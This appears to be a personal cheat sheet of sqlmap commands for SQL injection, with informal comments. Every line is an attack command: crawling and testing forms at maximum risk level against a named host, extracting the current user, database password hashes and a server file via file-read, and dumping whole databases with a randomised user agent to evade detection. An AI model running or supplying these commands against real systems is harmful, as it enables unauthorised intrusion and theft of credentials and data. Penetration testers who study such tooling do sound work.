#SQLMAP SANITY STUFF#
         
         

         # Automated SQLMAP scanz
       
sqlmap -u http://lazybastard.calvin --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3

          # Targeted scan 

sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/vindictive.php" 
 
          # scan union & error based sql, use a random user agent and dump that sht
 
 sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump

          # check forum injections
          
sqlmap -o -u "http://meh.com/form/" --forms
